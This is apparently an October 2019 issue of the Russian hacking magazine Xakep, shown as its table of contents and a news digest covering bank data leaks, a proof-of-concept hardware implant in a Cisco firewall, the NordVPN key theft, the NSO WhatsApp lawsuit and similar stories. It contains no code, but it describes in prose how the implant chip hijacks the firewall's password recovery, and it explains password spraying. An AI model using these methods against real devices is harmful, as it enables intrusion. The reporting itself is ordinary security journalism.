

                                                   Октябрь 2019
            № 247
CONTENTS

    MEGANews
  Всё новое за последний месяц

    Блиц-интервью
  Омар Ганиев (beched) о хакер ском опыте и участии в CTF

     Android
  Бэкдор в смартфо нах Huawei и осо бенности реaлизации TrustZone в Samsung

    Без слеж ки и зак ладок
  Как собрать свой мобиль ник и почему сегод ня это про ще, чем кажется

     Call Detail Record
  Как полиция вычисляет прес тупников без сложной тех ники

    Фреймворки для постэксплуатации
  Выбира ем меж ду Metasploit, Cobalt Strike, Merlin, Apfell, Faction C2, Koadic и другими

    Разведка в Active Directory
  Получа ем поль зователь ские дан ные в сетях Windows без привилегий

    Удаленный аккаунт
  Новый спо соб обма нуть гаран тов сделок в Telegram

    В королевстве PWN
  Обходим DEP и брут форсим ASLR на виртуалке с Hack The Box

    Комбайн для фишинга
  Как Evilginx 2 используют для кра жи акка унтов

    Лазей ка в Webmin
  Как работа ет бэкдор в панели управления сер вером

    Четыре с половиной пароля
  Как устроена система аутен тифика ции iOS

    Справоч ник анонима
  Как работа ют токены аутен тифика ции и в чем их отличия от паролей

    Полез ный демон
  Как перес тать бояться systemd и сделать свой сер вис для Linux

    Ос новы циф ровой схемотех ники
  Как логические элемен ты обра зуют биты памяти в твоем компьютере

    А мы пойдем в обход
  Прос тые рецепты для выборочного шиф рования тра фика в Linux

    Как сломать ябло ко
  Пошаговая инс трукция по джейлбрейку iOS 12

     Prex hijacking
  Исполь зуем RPKI для борь бы с потерей тра фика

    Непростой протокол
  Автоматизируем нас тройку адресов в IPv6

    Стой кий админ
  Строим отказоус той чивые сети в Linux с keepalived

    Пе чать силой мысли
  Как работа ют интерфейсы мозг — компьютер и на что они способ ны сегодня

    Делаем игровую приставку
  Как я собрал рет рокон соль в домашних усло виях

     Тит ры
  Кто дела ет этот журнал
                                       Мария «Mifrill» Нефёдова
                                                    nefedova@glc.ru





УТЕЧКИ СБЕРБАНКА
В октябре СМИ писали сра зу о нес кольких утечках данных, затронувших
Сбербанк. Все началось с того, что изда ние «Коммерсант» сообщило:
на черном рынке продаются данные клиентов Сбербанка, включая информа‐
цию о 60 миллионах карт (как действующих, так и закрытых, ведь в настоящее
время у банка около 18 миллионов активных карт).
  По информации изда ния, утечка могла про изойти в конце августа текуще‐
го года и оказалась одной из круп нейших в российском банковском секторе.
Представители Сбербанка признали утечку данных, но сначала заявили, что
проблема коснулась только 200 человек (именно столько в качес тве «фраг‐
мента для ознакомления» предоставил продавец похищенной БД).
  Одновременно с этим стало извес тно о завершении внутренне го рассле‐
дования,  проведенного  службой  безопас ности Сбербанка  и  правоох‐
ранительными органами. Проверка выявила, что сотрудник 1991 года рож‐
дения, руководитель сектора в одном из бизнес‐подразделений банка, имел
доступ  к базам данных и попытался похитить клиентскую информацию
в корыстных целях. Этот сотрудник уже дал признательные показания, и пра‐
воохранительные органы с ним работают.
  Но затем, 7 октября 2019 года, в Сбербанке сооб щили о дополнительных
фактах, выявленных в ходе рас следования. Стало извес тно, что в конце сен‐
тября 2019 года сотрудник, совершивший прес тупление, нес колькими тран‐
шами  продал  одной  из  преступных  групп  в  даркнете  в  совокуп‐
ности 5000 учетных записей кредитных карт Ураль ского банка Сбербанка,
значительное количество которых были устаревшими и неактивными. Под‐
черкивалось, что в нас тоящее время скомпро метированные карты уже
перевыпущены и угрозы для средств клиентов нет.
  «Коммерсант» сооб щал, что за нес колько часов до появления этого
пресс‐релиза в открытом доступе действительно была обнаруже на еще одна
БД держателей кредитных карт, на что обратил вни мание основатель ком‐
пании DeviceLock Ашот Оганесян. Журналисты изучили эту базу и подтвер‐
дили, что это новая часть утечки, частично приз нанной Сбербанком. Хуже
того, в свободном доступе рас пространяет ся еще несколько баз кредитных
карт, но меньшего объема (на 500 и 300 клиентов с похожей структурой дан‐
ных). Одна из БД имеет 1999 строк, из которых 1709 относятся к активным
картам, еще 290 — к закрытым.
  В свою очередь, «Ведомос ти» цитировали руководите ля отдела аналитики
SearchInform Алексея Парфенть ева: «Это абсолютно нормальная практика —
при продажах баз данных для демонстрации скидывать в доступ небольшой
кусочек выгрузки. Проблема в том, что Сбербанк очень скоропостижно решил
сделать выводы по кусочку с данными о 200 клиентах, который был опуб‐
ликован, пусть и в теневом интернете». Но, поскольку теперь в открытый дос‐
туп попали данные еще нескольких тысяч карт, эксперт полагает, что либо
банк попросту не знает, сколько данных утекло в действительности, либо
результаты расследования умалчиваются.
   Казалось бы, с проб лемой разобрались, но в конце месяца все тот же
«Коммерсант» сооб щил, что у Сбербанка произошла еще одна утечка.
На этот раз в Сети появилась БД, содержащая персональные данные кли‐
ентов Сбер банка, но также покупателям дампа пред лагали и запись пос‐
леднего разговора пользователя с кол‐центром банка.
  По информации журналистов, БД появилась в продаже на сетевом черном
рынке 13 октября текущего года. Один из про давцов утверждал, что рас‐
полагает базой данных клиентов банка, имеющих кредиты или кредитные кар‐
ты. Дамп содержит миллион строк с полными данными (паспорт, пропис ка,
адреса проживания, телефо ны, счета, сумма остатка или задол женности),
собранными с 2015 года до недавнего времени (за три недели октября база
пополнилась на 19 283 строки).
  Информация продава лась в любом объеме, то есть покупатель мог даже
назвать интересующие его критерии, по которым будет сформирована
выборка, например по региону, сумме на карте или размеру долга. Но наибо‐
лее необычной выглядела выгрузка по последнему звонку клиента в банк.
Продавец предлагал предоставить запись этого разговора, если таково
будет желание покупателя.
  Журналисты издания связались с продавцом дампа и изучили пробный
фрагмент базы, содер жащий данные о клиентах, вышедших на просрочку
по кредитам и кредитным картам. Судя по стол бцу «ТБ» (территориальный
банк), в выгрузке оказались данные из десяти территориальных банков (всего
их у Сбербанка один надцать). На некоторых клиентов приходится несколько
строк, если у них есть нес колько действу ющих кредитов. Судя по столбцам
«Дата образования прос рочки» и «Количество дней прос рочки», данные были
выгружены 25 сен тября. Выгрузка аудиозаписей, по словам продавца, про‐
изводится «с рабочего места», то есть в дневное время. Сам продавец приз‐
нался, что выступает перекупщиком. Про давал он одну строку за 30 рублей.
По его словам, база — это список должников, просрочивших выплаты по кре‐
дитам.
   Пресс‐служба Сбер банка отрицает новую утечку данных. «В Сбербанке
и его дочерних компаниях таких утечек персональных данных клиентов
не было», — заявили в банке. «Коммерсант» цитировал основате ля и тех‐
нического  директора компании  DeviceLock Ашота Оганеся на,  который
полагает, что дамп тем не менее может быть реаль ным:



      «С уче том того что продавец сообщил о воз можнос ти получить ауди-
      оза писи раз говоров, данные, воз можно, утек ли из внеш него кол‑цен-
       тра, обес печива юще го работу с должниками», — пред положил Ога-
      несян.

Также пробный фрагмент базы приобрели и изу чили журналис ты «Известий»,
убедившись в его подлинности при помощи приложения «Сбербанк Онлайн»,
где при переводе по номеру телефо на можно увидеть имя, отчество и первую
букву фамилии получателя. По данным издания, дамп содержал информа‐
цию 11 500 граждан, бравших кредит в Сбербанке.


ДРУГИЕ УТЕЧКИ ЭТОГО МЕСЯЦА

Эксперты обнаружили в открытом доступе налоговую информацию 20 миллионов россиян


СМИ сообщили об утечке данных 8,7 мил лиона клиентов «Билайн»


Из‐за взлома кардер ского сайта BriansClub произошла утечка 26 миллионов банковских карт


Adobe оставила в открытом дос тупе дан ные 7 500 000 пользователей Adobe Creative Cloud


Банк UniCredit сообщил об утечке данных 3 000 000 клиентов



62% ПРОМЫШЛЕННЫХ ПРЕД ПРИЯТИЙ ИСПОЛЬЗУЮТ
СТАРЫЕ ОС

Эксперты компании CyberX собирали данные более чем из 1800 сетей своих кли ентов по всему
миру с октября 2018 года по октябрь 2019 года. Получен ная таким образом статис тика ока‐
залась весьма удручающей: более 60% сетей на промышленных предприятиях до сих пор
содержат устройства, работающие под управлением устаревших опе рационных сис тем (Win‐
dows XP и Windows 2000).


Если прибавить сюда еще и Windows 7, чья под держка тоже заканчивается совсем скоро,
в январе 2020 года, то этот показатель сос тавит уже 71%.

Наиболее защищенными предприятиями, продемонс трировавшими наилучшие результаты,
оказались компании нефтегазового и энергетического сектора.





ЖУЧОК В CISCO
Прошло больше года с тех пор, как изда ние Bloomberg опубликовало статью,
рассказывающую об аппаратных «закладках», которые якобы были обнаруже‐
ны на серверных платах Supermicro и позволили китайским хакерам скомпро‐
метировать их.
   Так как это оборудование используют крупные техничес кие компании,
вклю чая Apple и Amazon, разразился грандиозный скандал. Представители
Amazon  и  Apple  поспешили  категоричес ки  опровергнуть  заявления
Bloomberg, и даже АНБ сообщило, что это была «ложная тревога». В итоге вся
эта история удостоилась сра зу двух наг рад Pwnie: как «самый перехайплен‐
ный баг» и «самый крупный epic fail».
  И хотя сообщения Bloomberg так и не нашли никаких подтверждений, воз‐
можность создания подобных «закладок», конечно, нельзя пол ностью сбра‐
сывать со счетов. Так, специалист компании FoxGuard Монта Элкинс (Monta
Elkins) решил продемонс трировать, что в этом нет ничего сложного. Резуль‐
таты своей работы он предста вил на конференции CS3STHLM в конце
октября, а до этого поделился с изда нием Wired.
  Для внедрения жучка в брандмауэр Cisco Элкинсу понадобились: паяль‐
ная станция за 150 дол ларов, микроскоп за 40 долларов, несколько мик‐
росхем за 2 доллара. Все это он заказал онлайн.


     «Нам кажется, что все это какая‑то магия, но на самом деле это не
       так уж сложно, — рас ска зыва ет Элкинс. — Продемонс трировав людям
      железо, я хочу сде лать все это более реалис тичным. Это не магия.
      Это не невоз можно. Я мог бы сде лать это в своем под вале. И есть
     много людей умнее меня, которые могут сде лать такое прак тичес ки
      из ничего».

Для создания своей «закладки» Элкинс использовал миниатюрный чип AT‐
tiny85, который он нашел на Digispark Arduino за 2 доллара. Записав на чип
собственный код, Элкинс снял его с платы Digispark и при паял к материнской
плате брандмауэра Cisco ASA 5505. Для раз мещения чипа он использовал
незаметное место, которое не требовало дополнительных контактов и поз‐
воляло получить доступ к COM‐порту.
  По приведенной ниже иллюс тра ции можно понять, нас колько сложно
будет заметить такой «лишний» чип на плате, даже при относительно неболь‐
ших размерах ASA 5505 (6 на 7 дюймов). Элкинс предполагает, что он мог бы
использовать чип еще мень шего размера, но выбрал  ATtiny85,  чтобы
упростить ту часть эксперимента, что была связана с программированием.





Элкинс запрограммировал свой жучок на атаку сразу после того, как бран‐
дмауэр будет размещен и вклю чен в дата‐центре цели. Чип выдает себя
за администратора, который обращает ся к нас трой кам брандмауэра, под‐
клю чая компьютер напрямую к порту. Затем чип запускает функцию вос ста‐
новления пароля брандма уэра, создает новую учетную запись администра‐
тора и получает доступ к настройкам. После этого воз можно изме нить нас‐
тройки брандмауэра и предоставить злоумышленникам удаленный доступ
к устройству.
  Иссле дователь объясняет, что он использовал Cisco ASA 5505 в своем
эксперименте, потому что брандма уэр ока зался самым дешевым на eBay.
Но атака должна сработать против любого межсетевого экрана Cisco,
который предлагает восста новление пароля подоб ным образом. Специалис‐
ты Cisco заверили, что уже изучают исследова ние Элкинса и, если понадо‐
бится, примут необ ходимые меры.
  В сущности, иссле дование Элкинса продолжает дру гой, более ранний
эксперимент, проведенный независимым ИБ‐экспертом Треммеллом Хад‐
соном (Trammell Hudson). В прошлом году на конференции Chaos Computer
Conference тот продемонс трировал PoC платы Supermicro, на которой были
воссозданы «закладки» китайских хакеров, как те были описаны в статье
Bloomberg. То есть на плату был установлен чип с доступом к BMC (baseboard
management controller).
  При этом оба специалиста подчеркивают, что они не пытались подтвер‐
дить историю Bloomberg о широко распространенных атаках на цепочку пос‐
тавок, и даже не утвержда ют, что подобные ата ки часто встречаются в реаль‐
ности. Также иссле дователи отмечают, что тра дици онные софтверные атаки
в большинстве случаев сработают ничуть не хуже, предос тавив хакерам такой
же доступ. Однако Элкинс и Хадсон доказывают, что аппаратный шпионаж
с помощью атак на цепочку пос тавок — это реаль ность и реализовать подоб‐
ное куда легче, чем многие думают.



      «Я хочу, чтобы люди приз нали, что подобные имплантаты — это не
      плод чьего‑то воображения. Они относительно прос ты, — говорит
      Элкинс. — И если мне под силу сде лать такое, зна чит, кто‑то с сот-
      нями миллионов бюд жета занима ется подобным уже некоторое вре-
       мя».


ЛОЖНОЕ ЧУВСТВО БЕЗОПАСНОСТИ
Главный евангелист компании BlackBerry Брайан Робисон (Brian Robison) поговорил с жур‐
налистами издания Forbes о безопасности мобильных приложений и официальных магазинов
для Android и iOS, подчеркнув, что механизмы безопас ности в App Store и Google Play удалось
обойти сотням вредоносных приложений. Дело в том, что недавно исследовательская команда
Cylance подготовила отчет, согласно которому в официальные каталоги приложе ний зачастую
проникает не только различная малварь, но и шпионские «продук ты», созданные правитель‐
ственными хакерами.





→«Люди не так сильно оберегают свои мобильные устройства от вложения неизвес тных лич‐
ностей, как ноутбуки или настольные компьютеры. Потребители испытывают ложное чувство
безопасности по отношению к официальным магазинам приложе ний. Мы живем с этим ложным
чувством, считая, что все представленное в магазинах приложений безопасно. Но лично я
не доверяю приложениям. Точка. И я бы советовал пользователям держать свое чутье нагото‐
ве»
— заявил Брайан Робисон





ЗАКРЫТИЕ WELCOME
TO VIDEO
Британское Национальное агентство по борь бе с преступностью и американ‐
ское Министерство юстиции расска зали, что им уда лось закрыть ресурс Wel‐
come to Video — один из крупнейших сайтов в даркнете, распространяющих
детское порно. В расследовании, длившемся несколько лет, приняли участие
правоохранительные органы Германии, Южной Кореи, Саудовской Аравии,
ОАЭ и Чешской Республики.
   Власти сообщили об изъятии более вось ми терабайт видео  (око‐
ло 250 000 видеофайлов), демонстри рующего сексуальную экс плуатацию
детей. В настоящее время сот рудники организации National Center for Missing
& Exploited Children занимаются анализом этих видео, и уже известно, что
примерно 45% изученных роликов — это новый контент, о существовании
которого ранее известно не было.
  В США и еще один надцати стра нах мира уже были арестованы и обви‐
нены 337 человек, так или ина че связанных с этим сайтом. К примеру, бри‐
танские правоохранители сообщают о восемнадцати рас следованиях и семи
осужденных, один из которых был заключен в тюрьму на 22 года за изнасило‐
вание пятилетнего мальчика и заг рузку на Welcome to Video ролика, который
демонстрировал сексуальное насилие над трехлетней девочкой.
  По  информации  Министерства   юстиции  США,   по   меньшей
мере 23 несовершеннолетние жертвы преступни ков, проживающие в Соеди‐
ненных Штатах, Испании и Великоб ритании, были спасены в результате про‐
веденной операции.
  Администратором  и  соз дателем  Welcome  to  Video,  появившегося
с 2015 году, выступал 23‐летний граж данин Южной Кореи Чон Ву Сон (Jong
Woo Son). В настоящее время он находится в тюрьме в Южной Корее, где уже
отбывает длительный тюремный срок из‐за своей деятельности, но соответс‐
твующие обвинения по девяти пунктам (вклю чая распространение изоб‐
ражений сексуального насилия над детьми и отмывание денег) теперь предъ‐
явлены ему и правоох ранителями из США.
  Следователи пишут, что Welcome to Video был одним из первых сайтов
в даркнете,  который монетизировал  сексуаль ную  эксплу атацию  детей,
используя биткой ны. Каж дый пользователь сайта получил уникальный бит‐
койн‐адрес при создании учетной записи. По оценкам правоохранительных
органов, с сайтом были связаны около миллиона таких кошельков. Поль‐
зователи либо платили 0,03 бит койна за права на ска чивание контента, либо
зарабатывали,   загружая  на   сайт  новые  материалы.  За  период
с июня 2015 года по март 2018 года (именно тог да ресурс был закрыт) через
сайт прошло 370 тысяч долларов в криптовалюте.
   Стоит заметить, что следова телям повезло: на протяже нии недолгого вре‐
мени сервер Welcome to Video был настро ен неправильно, что позволило
выявить несколько публичных IP‐адресов, свя занных с сайтом. Но также
следствию помогли упомянутые выше биткойн‐кошельки и криптовалютные
транзакции, изучением которых занимались агенты Налогового управления
США, привлеченные к делу. В этом им помогли инстру менты компании
Chainalysis, предназначенные для анализа блокчейн‐транзакций и определе‐
ния их участников. Ранее специалисты Chainalysis помогали властям в рас‐
следовании деятельности ныне не существу ющей и печально известной бир‐
жи BTC‐e, через которую отмывали день ги.
  Правоохранительные орга ны называют закрытие Welcome to Video одной
из крупнейших и наиболее отвратительных операций такого рода.



      «Опе раторам сер висов для анонимизации, таких как Tor, стоит спро-
      сить самих себя, дела ют ли они дос таточ но для того, чтобы защитить
      детей и сде лать свою платформу неп ригод ной для прес тупников», —
      ком ментирует  замес титель  генерального  прокурора США  Ричард
      Даунинг.


100 000 000 АТАК НА УМНЫЕ УСТРОЙСТВА


Эксперты «Лаборатории Касперского» подготовили отчет, пос вященный активнос ти вредоно сов
для устройств интернета вещей (IoT). Для про ведения исследования аналитики раз мести ли
более 50 ханипотов по всему миру, в среднем обрабатывающих 20 000 зараженных сессий
каждые 15 минут.

В первой половине 2019 года компания зафиксировала более 105 000 000 атак на устройства
интернета вещей с 276 000 уникальных IP‐адресов.

Это в 9 раз больше, чем в аналогичном периоде 2018 года: тог да было зафиксировано около
12 000 000 атак с 69 000 IP‐адресов.

Россия вошла в пер вую пятерку стран — источников заражений: из нее исхо дила примерно
каждая девятая атака (11%). В этом топе также оказались Китай (30%), Бразилия (19%), Египет
(12%) и США (8%).





Чаще всего злоумышленники заражают сети умных устройств для проведения DDoS-атак
или чтобы использовать их в качестве прок си‑сервера.

С января по июнь 2019 года самыми активными были семейства Mirai и NyaDrop, на них
пришлось по 39% атак. Третьим по распространенности с большим отрывом оказалось
семейство Gafgyt (2%).





ВЗЛОМ NORDVPN
И TORGUARD
Уже не раз было доказано на практике, что не стоит рекламировать свой про‐
дукт как «невзламываемый». Подоб ные громкие заявления редко заканчива‐
ются хорошо. Очередным подтверждением этому стал случай с VPN‐провай‐
дером NordVPN, разместившим в Twitter смелую рекламу, которая гласила,
что ни один хакер не сможет украсть онлайн‐жизнь пользователя, если тот
использует VPN.





Из‐за этих нескромных заявлений ком пания не только подверглась критике.
В ответ на это сообщение ИБ‐специалист, известный как hexdeﬁned, заметил
в Twitter, что NordVPN был скомпромети рован, так как приватные ключи (в том
числе OpenVPN и для сертифика та официального сайта компании) похищены
и публично доступны в интернете.





Хотя в настоящее время срок действия сертификата уже истек, закончившись
в октябре 2018 года, до его истечения злоумыш ленники могли создать убе‐
дительный сайт, выдающий себя за NordVPN, а также использовать ключи,
например для организа ции MitM‐атак и «прос лушивания» зашиф рованных
соединений. Иссле дователь привел при мер того, как мог выглядеть такой
поддельный ресурс.





После публикации сооб щения hexdeﬁned в Сети также появилась ссылка
на 8chan, где неизвестный еще в мае 2018 года похвалялся тем, что имеет
root‐доступ к серверам NordVPN, TorGuard и VikingVPN. Провайдер OpenVPN
CryptoStorm.is сообщил, что это позволило злоумышленнику похитить ключи
OpenVPN и файлы конфигура ции (это демонс трирует изображение ниже).
Также в CryptoStorm.is подчеркну ли, что кра жа клю чей могла поз волить зло‐
умышленнику расшифро вать трафик во время взло ма.


                                     Продолжение статьи →
← Начало статьи





  Согласно сообщению на 8chan, взломщику также удалось скомпромети‐
  ровать TorGuard (похитив сертификат прокси‐сервера Squid, ключи OpenVPN
  и файлы конфигурации) и VikingVPN (похитив клю чи OpenVPN и файлы кон‐
  фигурации). NordVPN и TorGuard опуб ликова ли официальные заявления
  о случившемся. Представители VikingVPN пока хранят мол чание.
     Представите ли NordVPN сообщили, что инци дент имел место еще в мар‐
   те 2018 года. Тогда один из центров обработки данных в Финляндии, где ком‐
  пания арендовала серверы, ока зался доступен без авторизации (в нас‐
  тоящее время контракт с этим пос тавщиком услуг уже расторгнут). В итоге
  доступ к серверу действительно получил зло умышленник, «используя небезо‐
  пасную систему удаленного управления».
    В компании уверяют, что ранее об этом инци денте не сообщали, так
   как специалисты дол гое время не знали об этой оплошности поставщика
   услуг, а затем «дол жны были убедиться, что инфраструктура не может быть
  подвержена другим подоб ным проблемам». Соответству ющая проверка
  заняла много времени «из‐за огромно го количес тва серверов и сложности
  инфраструктуры». Также в заявлении подчерки вает ся, что дру гие серверы
  компании не пострадали, равно как и учет ные данные пользовате лей.



        «Сер вер не содер жал никаких жур налов активнос ти пользовате лей,
          так как ни одно из наших приложе ний не переда ет учетные данные,
         использованные для аутентифика ции, поэтому име на пользовате лей
        и пароли не могли быть перехвачены», — заяв ляют в NordVPN.

  Интересно, что, по данным издания The Register, проштрафившимся ЦОД
  была финская компания Creanova. И ее глава Нико Вискари (Niko Viskari)
  сообщил журналистам, что вина за случившееся полностью лежит на самой
  NordVPN, так как в компании не заб локировали интерфейс удаленного
  управления, о котором прекрасно зна ли и даже использовали. По его словам,
   у NordVPN были проб лемы с безопасностью, которые тем не менее компанию
  не вол новали.
    В свою очередь, представители TorGuard подтвердили факт компромета‐
  ции и кражи секретного клю ча для TLS‐сертификата *.torguardvpnaccess.com,
  связанного с прок си‐сертификатом Squid (который был недействителен
   в сети TorGuard с 2017 года). В компании уверяют, что узнали о случившемся
   только в мае 2019 года, тогда как взло ман был единственный сервер, раз‐
  мещавшийся   у   неко его   хос тинг‐пос редника,   и   это   произошло
  еще в 2017 году.
    При этом в заявлении TorGuard подчерки вает ся, что компания единс твен‐
  ная из трех пострадавших провайдеров исполь зовала PKI, то есть основной
  ключ CA не размещался на уязвимом сервере и не был украден, а похищен‐
  ный ключ был бесполезен для взломщиков.


  FANCY BEAR АТАКОВАЛИ УЖЕ 16 АНТИДОПИНГОВЫХ
  ОРГАНИЗАЦИЙ

   Аналитики компании Microsoft утверждают, что рус ско язычная хак‐группа Fancy Bear (она же
   Strontium и APT28) атаковала как минимум 16 антидопинговых организаций в преддве рии
   Олимпиады в Токио, которая пройдет в следующем году.

   Fancy Bear использовала обычные для себя техники: направленный фишинг, password
   spraying (имена пользователей перебирают и пытаются использовать с одним и тем же
   паролем, надеясь обнаружить плохо защищен ную учетную запись), атаки на IoT-девайсы,
   а также всевозможную малварь, включая опенсорсную и кастомную. По дан ным Microsoft,
   некоторые из этих атак были успешными, но далеко не все.





 ПРОБЛЕМЫ
 SAMSUNG
  СМИ обнаружили весьма странную проб лему в Samsung Galaxy S10. Как ока‐
   залось, при использовании защитной плен ки для экрана сканер отпечатков
  пальцев работает некорректно и устрой ство можно разблокировать абсолют‐
  но любым отпечатком.
    Первым о баге расска зало британское издание The Sun. Лиза Нильсон
  получила телефон в подарок от мужа и решила защитить экран специальной
  пленкой. Вскоре она обна ружила, что, хотя в биометричес ких настройках
  устройства зарегистрирован  только ее собс твенный отпечаток пальца,
  девайс разблокируется при использовании любого отпечатка. Так, разбло‐
  кировать аппарат без проблем сумели ее муж и сестра, хотя их отпечатки
   никогда не регистрирова лись в системе.
    Напомню, что Galaxy S10 и S10+ ста ли первыми смартфонами компании,
  которые создают 3D‐модель отпечатка пальца с помощью ультразвука, а усо‐
  вершенствованный и более надежный ска нер рас положен под дисплеем
  устройства.
    В итоге представители Samsung подтвердили, что речь идет не о единич‐
  ном случае брака, а о распространенной проб леме, затрагивающей смар‐
  тфоны Galaxy S10, S10+, S10e и Note10. В компании объясни ли, из‐за чего
  возникает баг.
     Оказалось, ультразвуковые сканеры отпечатков в Galaxy Note10/10+,
  а также S10 / S10+ / S10 5G некорректно вза имодействуют с силиконовы ми
   накладками на экран во время создания 3D‐модели отпечатков. В сущ ности,
   сканер создавал и запоминал не модель отпечатка пальца, а модель струк‐
  туры силико на, находящейся под пальцем поль зователя. Именно поэтому
  любой, кто нажимал на силиконовую накладку, мог раз блокировать устрой‐
   ство, ведь датчик «видел» все тот же знакомый силикон, а не обнаруживал
  фактический отпечаток.
     Хотя патч для проб лемы появился весьма оперативно, несколько банков,
  работающих в Великоб ритании, успели временно приостановить услуги
  мобильного банкинга для пользователей Samsung Galaxy S10. Так, National
   Westminster Bank и Royal Bank  of Scotland отклю чили свои при ложения
  из Google Play Store для клиентов с телефонами Samsung Galaxy S10 из сооб‐
  ражений безопасности.
     Кроме того, пользователи Reddit из Израиля сооб щали, что местные бан‐
   ки просто отключили аутентифика цию с использовани ем отпечатков пальцев.
  Пользователь из США жаловался, что банк не позволил ему использовать
  Samsung Pay в банкомате, хотя неяс но, было это связано с технической
  ошибкой или тоже обус ловлено решени ем банка (транзакции Samsung Pay
  можно подтверждать с помощью отпечатка паль ца).
     Почти одновременно с этим китайские СМИ сообщили, что владельцы уяз‐
  вимых устройств лишились возможности использовать отпечатки пальцев
  для приложения Банка Китая, платежной сис темы WeChat  Pay, принад‐
  лежащей китайскому технологичес кому гиганту Tencent, и популярной плат‐
  формы мобильных платежей Alipay, принадлежащей Ant Financial, за которой
   стоит Alibaba.
     Отметим, что это не единс твенная серьезная проблема с биометрией
   в этом месяце. Так, в октябре Google предста вила смартфоны Pixel 4 и Pixel 4
   XL, и оказалось, что в Pixel 4 функция Face Unlock работает даже в том случае,
  если у владельца устройства закрыты глаза. А значит, Face Unlock могут
  использовать третьи лица, даже когда вла делец смартфона спит или находит‐
  ся в бессознательном состоянии.


  ОТ БЛОКИРОВОК К ШТРАФАМ
   На шестой Всемирной конферен ции по управлению интернетом, что недавно прошла в Учжэне,
   глава Роскомнадзора Александр Жаров рас сказал, что рос сийские власти намерены перейти
   от блокировок к применению штрафов, и уточнил, что правила должны быть одинаковыми
   для всех: государств, корпораций, людей.





  →«В настоящее время в РФ проходит обсужде ние законоп роекта, который предписывает
   достаточно серьезные штрафы для ком паний, которые не соб людают законодательство
   в области регулирования интернета. Мне кажется, это очень серьезный и эффективный шаг
   вперед. Если мы еще несколько лет назад говорили о том, что нарушители должны быть заб‐
   локированы, то теперь, мне кажется, есть более цивилизованный и эффективный метод, когда
   его наказывают „экономическим рублем“, — таким образом мы добиваемся, чтобы он соблюдал
   местное законодательство»
  — заявил Александр Жаров





 FACEBOOK VS NSO
  Компания Facebook обра тилась в суд с иском против израильской фирмы
  NSO  Group,  которая занимается  разработкой и продажей шпионских
  решений и так называемой легальной малвари.
    NSO Group была основана в 2010 году и с тех пор занимается разработ‐
  кой различной легальной малвари, которую, наряду с эксплоитами для раз‐
  личных  0‐day, продает пра витель ствам и спецслужбам по все му миру.
  Широкую известность NSO Group получила в 2016–2017 годах, когда спе‐
  циалисты по информационной безопас ности обнаружили мощ ные шпионские
  инструменты Pegasus и Chrysaor, раз работанные компанией и предназначен‐
  ные для iOS и Android.
     Тогда эксперты называли NSO Group не иначе, как «торговцами киберо‐
  ружием», а компания, которая даже не имела пуб личного сайта и старалась
   всегда держаться в тени, была вынуж дена выпус тить офи циальное заявление.
  Оно гласило, что «мис сия NSO — это сделать мир безопаснее, поставляя
   авторизованным  правительственным  структурам   технологии,  которые
  помогают им бороться с преступностью и терроризмом».
    Поводом для иска пос лужила уязвимость нулевого дня в WhatsApp,
   которая, как утверждает Facebook, была продана NSO Group, а затем ком‐
  пания помогала исполь зовать проблему для атак на правозащитников, жур‐
  налистов,  политических  диссидентов, дипломатов и правительственных
  чиновников. Согласно судебным документам, в общей сложности за один‐
  надцать дней от атак пос традали более 1400 человек в США, Бахрейне, Объ‐
  единенных Арабских Эмиратах и Мексике. Facebook уже направила всем пос‐
   традавшим специальные сооб щения в WhatsApp.
    Напомню, что о данной 0‐day‐проблеме стало известно в мае текущего
   года. Тогда издание Financial Times утверждало, что NSO Group раз работала
  для нее эксплоит, который зло употреблял функци ональностью VoIP‐звонков
   в WhatsApp. Так, жертва получала вызов в WhatsApp, и спе циально созданные
  пакеты RTCP  позволяли  зло умышленнику  запустить  вредоносный  код
  на устройстве, что приводило к установке Pegasus (независимо от того,
  использовала жертва Android или iOS). В итоге раз работчики Facebook были
  вынуждены выпустить срочные обновления и исправили уязвимость, но тогда
  компания не сделала никаких официальных заявлений, не считая публикации
  нескольких простых рекомендаций для пользователей.
     Теперь представите ли Facebook рассказали журналис там Washington Post,
   что собрали достаточ но доказательств причас тности NSO Group к этому
  инциденту и сочли нужным обра титься в суд. Так, ата ки оказались сопряжены
  с серверами и хостинго выми сервисами, которые ранее уже связывали
  с NSO Group, и, кроме того, некоторые аккаунты WhatsApp, использованные
   в ходе атак, также удалось проследить до изра ильской фирмы.
    Социальная сеть намеревается привлечь NSO Group к ответственности,
   в том числе согласно закону о компьютер ном мошенничестве и злоупот‐
  реблении, доказав, что компания была связана с активной хакерской кам‐
  панией и занимается не только легальным бизнесом.
     Также вскоре стало известно, что Facebook уже забанила сотрудников
  NSO Group на сво их платформах. «Ваша учет ная запись была удалена из‐за
  нарушения наших правил. Вы не смо жете войти в эту учетную запись, и никто
  другой не сможет ее увидеть. Мы не можем вос станавливать учетные записи,
  которые были удалены из‐за нарушений такого рода», — такое сообщение
   в Instagram получил один из служащих изра иль ской фирмы.





  Дело в том, что судебный иск среди про чего предусматривает постоянный
  судебный запрет, запреща ющий всем сотрудникам NSO Group получать
  или пытаться получить доступ к службам, платформе и компьютерным сис‐
  темам  WhatsApp  и  Facebook.  Но,  похоже,  социальная  сеть  решила
  не дожидаться решения суда и начала банить всех причастных к деятельности
  NSO Group уже сейчас. Жалобы на блокировку можно найти на израильских
  форумах, а также на LinkedIn. Пользователи пишут, что блокировки зат‐
  ронули 98% сотрудников компании и даже кос нулись людей, не имеющих
  отношения к NSO Group.



         «Вче ра мои лич ные профили в Facebook и Instagram были пред-
        намеренно заблокированы величайшим нарушителем конфиденциаль-
         нос ти в истории челове чес тва aka Facebook. Почему? Потому что я
        работаю в ком пании под наз ванием NSO Group и, согласно их заяв-
        лениям, обна ружил и использовал уяз вимос ти в архитек туре What-
         sApp, чтобы пре дос тавить спец службам и пра вительствам сложные
        инс тру менты для пре дотвра щения сле дующе го 9/11», — воз муща ется
         на LinkedIn руководитель по под готов ке кад ров NSO Group Гай Брен-
        нер (Guy Brenner).

  Представители NSO Group уже отреагировали на происходящее, сообщив,
   что намерены бороться с выдвинутыми обвинениями, и в очередной раз
  заверили СМИ, что предос тавляют свои технологии только лицензированным
  правительственным, раз ведывательным и правоохранительным органам, что‐
  бы помочь тем бороться с терроризмом и прес тупностью. В компании утвер‐
  ждают, что соблюдают законы и рекомендации ООН, пресекая любые зло‐
   употребления своими про дуктами.


  1000 ЕВРО ЗА ОДИН ВЗЛОМ БАНКОМАТА


   Согласно свежему отчету Европейской группы по обес печению безопасности бан коматов (Eu‐
   ropean ATM Security Team, EAST), в Европе теперь совсем непопулярны атаки на банкоматы
   при помощи малвари и джекпоттин га: они приносят прес тупникам менее 1000 евро за одно
